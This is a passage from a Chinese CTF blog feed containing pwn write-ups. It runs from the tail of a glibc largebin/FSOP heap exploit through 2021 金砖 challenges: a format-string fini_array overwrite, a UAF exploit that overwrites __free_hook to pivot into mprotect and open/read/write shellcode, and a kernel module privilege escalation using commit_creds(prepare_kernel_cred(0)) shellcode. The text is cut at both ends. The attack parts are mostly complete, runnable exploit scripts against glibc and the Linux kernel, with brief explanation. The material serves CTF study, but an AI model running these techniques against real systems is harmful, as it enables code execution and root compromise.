cat需要的IO结构体</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    让原先指向的overflow变成_IO_wfile_seekoff</span><br><span class="hljs-string">    然后让_wide_data-&gt;vtable-&gt;overflow变成system函数</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>c_l=[]<br><span class="hljs-comment">## edit printf_function_table ##</span><br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x440</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x441</span>),<span class="hljs-number">1</span>)<br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">0x30</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x31</span>),<span class="hljs-number">1</span>)<br>edit(<span class="hljs-number">2</span>,<span class="hljs-number">0x450</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x451</span>),<span class="hljs-number">1</span>)<br>edit(<span class="hljs-number">3</span>,<span class="hljs-number">0x30</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x31</span>),<span class="hljs-number">1</span>)<br>edit(<span class="hljs-number">4</span>,<span class="hljs-number">0x30</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x31</span>),<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0x500</span>)<br><br>edit(<span class="hljs-number">2</span>,<span class="hljs-number">0x8</span>,p64(func_table-<span class="hljs-number">0x20</span>),off=<span class="hljs-number">0x28</span>)<br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x500</span>)<br><br>edit(<span class="hljs-number">2</span>,<span class="hljs-number">0x10</span>,p64(fake_heap)*<span class="hljs-number">2</span>,off=<span class="hljs-number">0x20</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x10</span>,p64(fake_heap+<span class="hljs-number">0x440</span>+<span class="hljs-number">0x30</span>)*<span class="hljs-number">2</span>,off=<span class="hljs-number">0x20</span>)<br>add(<span class="hljs-number">0x448</span>)<br>add(<span class="hljs-number">0x438</span>)<br><br><br><span class="hljs-comment">## edit printf_arginfo_table ##</span><br>free(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0x500</span>)<br>edit(<span class="hljs-number">2</span>,<span class="hljs-number">0x8</span>,p64(arg_table-<span class="hljs-number">0x20</span>),off=<span class="hljs-number">0x28</span>)<br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x500</span>)<br>edit(<span class="hljs-number">2</span>,<span class="hljs-number">0x10</span>,p64(fake_heap)*<span class="hljs-number">2</span>,off=<span class="hljs-number">0x20</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x10</span>,p64(fake_heap+<span class="hljs-number">0x440</span>+<span class="hljs-number">0x30</span>)*<span class="hljs-number">2</span>,off=<span class="hljs-number">0x20</span>)<br>add(<span class="hljs-number">0x448</span>)<br>add(<span class="hljs-number">0x438</span>)<br><br><span class="hljs-comment">## edit io_list_all ##</span><br>edit(<span class="hljs-number">5</span>,<span class="hljs-number">0x440</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x441</span>),<span class="hljs-number">1</span>)<br>edit(<span class="hljs-number">6</span>,<span class="hljs-number">0x30</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x31</span>),<span class="hljs-number">1</span>)<br>edit(<span class="hljs-number">7</span>,<span class="hljs-number">0x30</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x31</span>),<span class="hljs-number">1</span>)<br><br>free(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0x500</span>)<br>edit(<span class="hljs-number">2</span>,<span class="hljs-number">0x8</span>,p64(io_list_all-<span class="hljs-number">0x20</span>),off=<span class="hljs-number">0x28</span>)<br>free(<span class="hljs-number">5</span>)<br>add(<span class="hljs-number">0x500</span>)<br>edit(<span class="hljs-number">2</span>,<span class="hljs-number">0x10</span>,p64(fake_heap+<span class="hljs-number">0x440</span>+<span class="hljs-number">0x30</span>+<span class="hljs-number">0x450</span>+<span class="hljs-number">0x30</span>+<span class="hljs-number">0x30</span>)*<span class="hljs-number">2</span>,off=<span class="hljs-number">0x20</span>)<br>edit(<span class="hljs-number">5</span>,<span class="hljs-number">0x10</span>,p64(fake_heap+<span class="hljs-number">0x440</span>+<span class="hljs-number">0x30</span>)*<span class="hljs-number">2</span>,off=<span class="hljs-number">0x20</span>)<br>add(<span class="hljs-number">0x448</span>)<br>add(<span class="hljs-number">0x438</span>)<br>edit(<span class="hljs-number">5</span>,<span class="hljs-built_in">len</span>(fake_io),fake_io)<br><br><span class="hljs-comment">## click assert ##</span><br>free(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0x700</span>)<br>edit(<span class="hljs-number">2</span>,<span class="hljs-number">0x8</span>,p64(top_chunk-<span class="hljs-number">0x20</span>),off=<span class="hljs-number">0x28</span>)<br>free(<span class="hljs-number">0</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x10</span>,p64(gadget),off=<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;s&#x27;</span>)*<span class="hljs-number">8</span>+<span class="hljs-number">16</span>)<br><br>add(<span class="hljs-number">0x700</span>)<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    如果top chunk+size没有与0x1000对齐时会调用malloc_assert</span><br><span class="hljs-string">    在malloc_assert中会调用fvprintf</span><br><span class="hljs-string">    在fvprintf函数中，如果printf_function_table中存在数据就会执行printf_arginfo_table表中对应的函数</span><br><span class="hljs-string">    在构造之后就是执行IO_cleanup函数</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>pwn</tag>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2021金砖-pwn</title>
    <link href="/page/wp/2021%E9%87%91%E7%A0%96-pwn/"/>
    <url>/page/wp/2021%E9%87%91%E7%A0%96-pwn/</url>
    
    <content type="html"><![CDATA[<h2 id="pmagic1">pmagic1</h2><p><img src="/img/blog_img/2021%E9%87%91%E7%A0%96/2021%E9%87%91%E7%A0%96-pwn-pmagic.jpg" srcset="/img/loading.gif" lazyload alt="main函数" title="main函数"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>(<span class="hljs-params">p,gadget</span>):<br>    libc=ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>    p.sendafter(<span class="hljs-string">&quot;name.\n&quot;</span>,<span class="hljs-string">&#x27;%43$p&#x27;</span>)<br>    libc.address=<span class="hljs-built_in">int</span>(p.readuntil(<span class="hljs-string">&#x27;Say&#x27;</span>,drop=<span class="hljs-number">1</span>),<span class="hljs-number">16</span>)-<span class="hljs-number">240</span>-libc.sym[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>    payload=<span class="hljs-string">b&#x27;&#x27;</span><br>    fini=<span class="hljs-number">0x600a78</span><br>    off=<span class="hljs-number">8</span><br>    gadget=libc.address+gadget<br>    pg=p64(gadget)<br>    p_d=&#123;&#125;<br>    p_l=[]<br>    off=<span class="hljs-number">8</span>+<span class="hljs-number">12</span><br>    <span class="hljs-keyword">for</span> i,v <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(pg):<br>        p_d[v]=off+i<br>        p_l.append(v)<br>    p_l.sort()<br><br><br>    <span class="hljs-keyword">for</span> i,v <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(p_l):<br>        <span class="hljs-keyword">if</span> v:<br>            payload+=(<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(v-p_l[i-<span class="hljs-number">1</span>])+<span class="hljs-string">&#x27;c%&#x27;</span>+<span class="hljs-built_in">str</span>(p_d[v])+<span class="hljs-string">&#x27;$hhn&#x27;</span>).encode()<br>        <span class="hljs-keyword">else</span>:<br>            payload+=(<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(p_d[v])+<span class="hljs-string">&#x27;$hhn&#x27;</span>).encode()<br>    payload=payload.ljust(<span class="hljs-number">96</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>        payload+=p64(fini+i)<br>    p.sendlineafter(<span class="hljs-string">&#x27;something.\n&#x27;</span>,payload)<br>    p.interactive()<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]:<br>    <span class="hljs-keyword">try</span>:<br>        p=process(<span class="hljs-string">&quot;./pmagic&quot;</span>)<br>        pwn(p,i)<br>        p.close()<br>    <span class="hljs-keyword">except</span> KeyboardInterrupt <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(e)<br><br></code></pre></td></tr></table></figure><h2 id="pwn2">pwn2</h2><p><img src="/img/blog_img/2021%E9%87%91%E7%A0%96/2021%E9%87%91%E7%A0%96-pwn-pwn2.jpg" srcset="/img/loading.gif" lazyload alt="main" title="main"></p><p><img src="/img/blog_img/2021%E9%87%91%E7%A0%96/2021%E9%87%91%E7%A0%96-pwn-pwn2-1.jpg" srcset="/img/loading.gif" lazyload alt="create" title="create"></p><p><img src="/img/blog_img/2021%E9%87%91%E7%A0%96/2021%E9%87%91%E7%A0%96-pwn-pwn2-2.jpg" srcset="/img/loading.gif" lazyload alt="delete" title="delete"></p><p><img src="/img/blog_img/2021%E9%87%91%E7%A0%96/2021%E9%87%91%E7%A0%96-pwn-pwn2-3.jpg" srcset="/img/loading.gif" lazyload alt="edit" title="edit"></p><p><img src="/img/blog_img/2021%E9%87%91%E7%A0%96/2021%E9%87%91%E7%A0%96-pwn-pwn2-4.jpg" srcset="/img/loading.gif" lazyload alt="show" title="show"></p><p><code>delete</code>函数中存在UAF，且<code>create</code>函数中可以创建较大的chunk，所以获取libc地址很简单，但是程序禁用了<code>execve</code>系统调用，所以需要使用<code>orw</code>获取<code>flag</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br>sla=<span class="hljs-keyword">lambda</span> a,b:p.sendlineafter(a,b)<br>sa=<span class="hljs-keyword">lambda</span> a,b:p.sendafter(a,b)<br>sl=<span class="hljs-keyword">lambda</span> a:p.sendline(a)<br>ru=<span class="hljs-keyword">lambda</span> a:p.readuntil(a)<br>rd=<span class="hljs-keyword">lambda</span> a:p.read(a)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,data=<span class="hljs-string">b&quot;\n&quot;</span></span>):<br>    sla(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;description&#x27;</span>,<span class="hljs-built_in">str</span>(size).encode())<br>    sa(<span class="hljs-string">&#x27;description&#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    sla(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,data</span>):<br>    sla(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind).encode())<br>    sa(<span class="hljs-string">&#x27;description&#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    sla(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind).encode())<br>    <span class="hljs-keyword">return</span> rd(<span class="hljs-number">6</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">att</span>(<span class="hljs-params">cmd=<span class="hljs-string">&quot;&quot;</span></span>):<br>    gdb.attach(p,cmd)<br>    pause()<br><br>p=process(<span class="hljs-string">&#x27;./orw_h2&#x27;</span>,)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br><br>add(<span class="hljs-number">0x78</span>) <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x78</span>) <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x438</span>) <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x78</span>) <span class="hljs-comment">#3</span><br><br>free(<span class="hljs-number">0</span>)<br><br>free(<span class="hljs-number">1</span>)<br>c_0=u64(show(<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))-<span class="hljs-number">0x10</span><br>success(<span class="hljs-string">&quot;chunk_0: &quot;</span>+<span class="hljs-built_in">hex</span>(c_0))<br><br>free(<span class="hljs-number">2</span>)<br>d=u64(show(<span class="hljs-number">2</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>malloc_hook=d-<span class="hljs-number">0x60</span>-<span class="hljs-number">0x10</span><br>libc.address=malloc_hook-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>success(<span class="hljs-string">&quot;libc_address: &quot;</span>+<span class="hljs-built_in">hex</span>(libc.address))<br><br>free_hook=libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>mprotect=libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br>rdi=libc.address+<span class="hljs-number">0x23b72</span><br>rsi=libc.address+<span class="hljs-number">0x2604f</span><br>rdx=libc.address+<span class="hljs-number">0x119241</span><br>leave=libc.address+<span class="hljs-number">0x5587e</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(leave))<br><br>gadget=libc.address+<span class="hljs-number">0x154d0a</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    可以修改rbp的值，达到栈迁移</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(gadget))<br>shellcode=shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./flag&#x27;</span>)+shellcraft.read(<span class="hljs-number">3</span>,c_0+<span class="hljs-number">0x10</span>,<span class="hljs-number">0x30</span>)+shellcraft.write(<span class="hljs-number">1</span>,c_0+<span class="hljs-number">0x10</span>,<span class="hljs-number">0x30</span>)<br>op_s=asm(shellcode)<br>op_s=op_s+<span class="hljs-string">b&#x27;\x00&#x27;</span>*(<span class="hljs-number">0x10</span>-(<span class="hljs-built_in">len</span>(op_s)&amp;<span class="hljs-number">0xf</span>))<br>shell_add=c_0+<span class="hljs-number">0x80</span>+<span class="hljs-number">0x80</span>+<span class="hljs-number">0x10</span><br><br>rop_add=shell_add+<span class="hljs-built_in">len</span>(op_s)<br><br>rop=flat([<br>    leave,<br>    rdx,<br>    <span class="hljs-number">0</span>,<br>    rop_add-<span class="hljs-number">0x28</span>,<br>    rdi,shell_add&amp;<span class="hljs-number">0xfffffffffffff000</span>,<br>    rsi,<span class="hljs-number">0x1000</span>,<br>    rdx,<span class="hljs-number">7</span>,<span class="hljs-number">0</span>,<br>    mprotect,<br>    shell_add<br>    ])<br><br>add(<span class="hljs-number">0x438</span>,op_s+rop) <span class="hljs-comment">#4</span><br>edit(<span class="hljs-number">1</span>,p64(free_hook))<br>chunk_data=p64(<span class="hljs-number">0</span>)*<span class="hljs-number">9</span>+p64(rop_add)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(rop_add))<br>success(<span class="hljs-string">&quot;free_hook: &quot;</span>+<span class="hljs-built_in">hex</span>(free_hook))<br><br>add(<span class="hljs-number">0x78</span>,chunk_data) <span class="hljs-comment">#5 2</span><br><br><br>add(<span class="hljs-number">0x78</span>,p64(gadget)) <span class="hljs-comment">#6 free_hook</span><br>free(<span class="hljs-number">5</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="pwn3">pwn3</h2><h3 id="启动脚本分析">启动脚本分析</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-comment">#boot.sh</span><br><span class="hljs-comment">#!/bin/sh</span><br>qemu-system-x86_64 \<br>    -m 128M \<br>    -kernel ./bzImage \<br>    -initrd  ./rootfs.cpio \<br>    -monitor /dev/null \<br>    -append <span class="hljs-string">&quot;root=/dev/ram rdinit=/sbin/init console=ttyS0 oops=panic panic=1 loglevel=3 quiet nokaslr&quot;</span> \<br>    -cpu kvm64 \<br>    -smp cores=2,threads=1 \<br>    -netdev user,<span class="hljs-built_in">id</span>=t0, -device e1000,netdev=t0,<span class="hljs-built_in">id</span>=nic0 \<br>    -nographic<br>    <span class="hljs-comment"># 开启系统时没有随机地址</span><br></code></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-comment">#/etc/rcS</span><br><span class="hljs-comment">#!/bin/sh</span><br><br>mount -t proc none /proc<br>mount -t sysfs none /sys<br>mount -t devtmpfs devtmpfs /dev<br><span class="hljs-built_in">mkdir</span> -p /dev/pts<br>mount -vt devpts -o gid=4,mode=620 none /dev/pts<br><span class="hljs-built_in">chmod</span> 666 /dev/ptmx<br><span class="hljs-built_in">cat</span> /proc/kallsyms &gt; /tmp/kallsyms<br><span class="hljs-comment"># 我们可以通过/tmp/kallsyms文件获取commit_creds与prepare_kernel_cred函数地址</span><br><span class="hljs-comment"># 如果可以构造commit_creds(prepare_kernel_cred(0))就可以获得root权限</span><br><span class="hljs-comment"># 因为prepare_kernel_cred(0) 是创建一个拥有特殊权限的用户的cred结构体</span><br><span class="hljs-comment"># commit_creds 是将当前用户的cred设置为参数cred结构体</span><br><span class="hljs-built_in">echo</span> 0 &gt; /proc/sys/kernel/kptr_restrict<br><span class="hljs-built_in">echo</span> 0 &gt; /proc/sys/kernel/dmesg_restrict<br><span class="hljs-built_in">exec</span> 0&lt;/dev/console<br><span class="hljs-built_in">exec</span> 1&gt;/dev/console<br><span class="hljs-built_in">exec</span> 2&gt;/dev/console<br><br><span class="hljs-built_in">chown</span> root:root /flag<br><span class="hljs-built_in">chmod</span> 400 /flag<br><br>insmod baby.ko<br><span class="hljs-built_in">chmod</span> 777 /dev/chardev0<br><br><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\nBoot took <span class="hljs-subst">$(cut -d&#x27; &#x27; -f1 /proc/uptime)</span> seconds\n&quot;</span><br>setsid cttyhack setuidgid 1000 sh<br><br>umount /proc<br>umount /sys<br>poweroff -d 0  -f<br></code></pre></td></tr></table></figure><h3 id="分析">分析</h3><p><img src="/img/blog_img/2021%E9%87%91%E7%A0%96/2021%E9%87%91%E7%A0%96-pwn-pwn3.jpg" srcset="/img/loading.gif" lazyload alt="chardev_init" title="chardev_init"></p><blockquote><p>这里注册了一个设备<code>chardev</code>，并且会在<code>/dev</code>目录下创建名为chardev0的设备</p></blockquote><p><img src="/img/blog_img/2021%E9%87%91%E7%A0%96/2021%E9%87%91%E7%A0%96-pwn-pwn3-2.jpg" srcset="/img/loading.gif" lazyload alt="chardev_exit" title="chardev_exit"></p><p><img src="/img/blog_img/2021%E9%87%91%E7%A0%96/2021%E9%87%91%E7%A0%96-pwn-pwn3-3.jpg" srcset="/img/loading.gif" lazyload alt="chardev_ioctl" title="chardev_ioctl"></p><blockquote><p>当我们对打开的/dev/chardev的文件句柄进行ioctl操作时会执行这个函数</p></blockquote><p><img src="/img/blog_img/2021%E9%87%91%E7%A0%96/2021%E9%87%91%E7%A0%96-pwn-pwn3-1.jpg" srcset="/img/loading.gif" lazyload alt=""><br>可以看到内核中的地址都是可读可写可执行的，而在<code>chardev_ioctl</code>函数中，存在任意地址写入，而且每次开启内核中的地址都不变，那么可以修改<code>chardev_ioctl</code>函数中<code>else</code>部分的代码为<code>commit_creds(prepare_kernel_cred(0))</code>，然后正常返回，之后在用户态调用<code>system(&quot;/bin/sh&quot;);</code>就可以查看<code>flag</code>文件了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* exp */</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ull unsigned long long int</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">int</span> fd=open(<span class="hljs-string">&quot;/dev/chardev0&quot;</span>,<span class="hljs-number">2</span>);<br>    <span class="hljs-type">char</span> shellcode[]=&#123;<span class="hljs-number">0x90</span>,<span class="hljs-number">0x90</span>,<span class="hljs-number">0x90</span>,<span class="hljs-number">0x90</span>,<span class="hljs-number">0x90</span>,<span class="hljs-number">0x90</span>,<span class="hljs-number">0x90</span>,<span class="hljs-number">0x90</span>,<span class="hljs-number">72</span>, <span class="hljs-number">199</span>, <span class="hljs-number">199</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">72</span>, <span class="hljs-number">199</span>, <span class="hljs-number">195</span>, <span class="hljs-number">32</span>, <span class="hljs-number">24</span>, <span class="hljs-number">10</span>, <span class="hljs-number">129</span>, <span class="hljs-number">255</span>, <span class="hljs-number">211</span>, <span class="hljs-number">72</span>, <span class="hljs-number">137</span>, <span class="hljs-number">199</span>, <span class="hljs-number">72</span>, <span class="hljs-number">199</span>, <span class="hljs-number">195</span>, <span class="hljs-number">48</span>, <span class="hljs-number">20</span>, <span class="hljs-number">10</span>, <span class="hljs-number">129</span>, <span class="hljs-number">255</span>, <span class="hljs-number">211</span>,<span class="hljs-number">0x5b</span>,<span class="hljs-number">0x41</span>,<span class="hljs-number">0x5c</span>,<span class="hljs-number">0x5d</span>,<span class="hljs-number">0xc3</span>,<span class="hljs-number">0x90</span>,<span class="hljs-number">0x90</span>,<span class="hljs-number">0x90</span>,<span class="hljs-number">0x90</span>,<span class="hljs-number">0x90</span>,<span class="hljs-number">0x90</span>,<span class="hljs-number">0x90</span>&#125;;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">        mov rdi,0</span><br><span class="hljs-comment">        mov rbx,0xffffffff810a1820</span><br><span class="hljs-comment">        call rbx</span><br><span class="hljs-comment">        mov rdi,rax</span><br><span class="hljs-comment">        mov rbx,0xffffffff810a1430</span><br><span class="hljs-comment">        call rbx</span><br><span class="hljs-comment">        pop arg</span><br><span class="hljs-comment">        pop cmd</span><br><span class="hljs-comment">        pop rbp</span><br><span class="hljs-comment">        retn </span><br><span class="hljs-comment">    */</span><br>    ull mod_add=<span class="hljs-number">0xffffffffc0000000</span>;<br>    ull commit_creds=<span class="hljs-number">0xffffffff810a1430</span>;<br>    ull kernel_cred=<span class="hljs-number">0xffffffff810a1820</span>;<br>    ull edit_add=mod_add+<span class="hljs-number">0x33</span>; <span class="hljs-comment">// 这是chardev_ioctl函数的返回部分代码的开头</span><br>    ull a[<span class="hljs-number">2</span>]=&#123;edit_add+<span class="hljs-number">40</span>&#125;;<br>    <span class="hljs-type">int</span> n=<span class="hljs-number">40</span>;<br>    <span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span 